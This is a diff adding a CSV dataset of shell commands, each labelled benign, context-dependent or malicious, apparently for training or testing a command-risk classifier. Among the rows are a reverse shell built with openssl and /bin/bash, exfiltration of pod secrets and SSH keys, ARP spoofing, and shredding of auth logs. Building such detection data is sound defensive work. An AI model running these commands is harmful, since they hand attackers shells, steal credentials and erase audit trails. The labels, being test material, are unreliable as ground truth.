@@ -1,0 +1,42 @@
+command,label,original_label,mitre_id
+strace -ff -o /tmp/node.trace -p $(pgrep node),Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -w /tmp/capture.pcap,Context_Dependent,ContextAugment,ContextAugment
+tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 9200,Benign,ContextAugment,ContextAugment
+nmap -sV --script=default 10.0.0.80,Context_Dependent,ContextAugment,ContextAugment
+tcpdump -i eth0 port 22 -w /tmp/ssh.pcap,Context_Dependent,ContextAugment,ContextAugment
+kubectl exec deploy/api -- cat /app/config/application.yml,Benign,ContextAugment,ContextAugment
+kubectl exec deploy/web -- sh -c 'tar cz /var/run/secrets' > /tmp/pod-secrets.tgz,Malicious,ContextAugment,ContextAugment
+ltrace -p $(pgrep apache2) -o /tmp/apache2-debug.ltrace,Benign,ContextAugment,ContextAugment
+arpspoof -i eth0 -t 192.168.1.20 192.168.1.20,Malicious,ContextAugment,ContextAugment
+strace -p $(pgrep java) -e trace=network -o /tmp/java-net.trace,Benign,ContextAugment,ContextAugment
+nmap -O 10.0.0.40,Context_Dependent,ContextAugment,ContextAugment
+strace -tt -p $(pgrep mysql) -o /tmp/mysql.strace,Benign,ContextAugment,ContextAugment
+scp /etc/os-release audit@10.0.0.40:/tmp/,Context_Dependent,ContextAugment,ContextAugment
+file /tmp/cli.tar.gz,Benign,ContextAugment,ContextAugment
+chisel client 192.168.1.30:8080 R:8443:127.0.0.1:443,Context_Dependent,ContextAugment,ContextAugment
+gdb -batch -p $(pgrep dockerd) -ex 'generate-core-file /tmp/dockerd.core',Context_Dependent,ContextAugment,ContextAugment
+ssh -D 3128 ci@log-collector,Benign,ContextAugment,ContextAugment
+scp /etc/ssl/certs/company.pem audit@10.0.0.60:/srv/review/cert-audit/,Benign,ContextAugment,ContextAugment
+openssl s_client -quiet -connect 10.0.0.5:5555 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5556,Malicious,ContextAugment,ContextAugment
+docker exec web sh -c 'cat /proc/1/environ',Context_Dependent,ContextAugment,ContextAugment
+scp /etc/ssl/certs/company.pem dba@10.0.0.100:/srv/audit/cert-audit/,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 5432,Benign,ContextAugment,ContextAugment
+ssh -D 9050 dev@192.168.1.100,Context_Dependent,ContextAugment,ContextAugment
+rsync -avz /home/dev/.ssh test@172.16.0.10:/tmp/stage/ 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
+nmap -O 192.168.1.20,Context_Dependent,ContextAugment,ContextAugment
+ssh -L 6405:10.0.0.20:31337 root@10.0.0.20,Context_Dependent,ContextAugment,ContextAugment
+docker exec web sh -c 'cat /var/log/nginx/access.log' > /tmp/web-access.log,Benign,ContextAugment,ContextAugment
+chisel client 192.168.1.100:8080 R:1080:socks,Context_Dependent,ContextAugment,ContextAugment
+tcpdump -i eth0 port 445 -w /tmp/smb.pcap,Context_Dependent,ContextAugment,ContextAugment
+find / -perm -4000 -type f 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
+shred -uzn 3 /var/log/auth.log,Malicious,ContextAugment,ContextAugment
+crontab -l,Benign,ContextAugment,ContextAugment
+rsync -avz /srv/app/releases/ audit@monitor.corp:/srv/review/releases/,Benign,ContextAugment,ContextAugment
+"socat TCP-LISTEN:9443,reuseaddr,fork TCP:192.168.1.100:443",Context_Dependent,ContextAugment,ContextAugment
+crontab -e,Context_Dependent,ContextAugment,ContextAugment
+scp /var/log/nginx/error.log ansible@10.0.0.90:/srv/review/,Benign,ContextAugment,ContextAugment
+rsync -avz /etc/ssh root@10.0.0.50:/tmp/stage/ 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
+scp /etc/ssl/certs/company.pem jenkins@172.16.2.8:/var/backups/cert-audit/,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 host 172.16.0.10 -w /tmp/host.pcap,Context_Dependent,ContextAugment,ContextAugment
+find /etc/kubernetes -maxdepth 2 -type f 2>/dev/null | head -50,Benign,ContextAugment,ContextAugment
+python3 -m http.server 0.0.0.0 8088,Context_Dependent,ContextAugment,ContextAugment
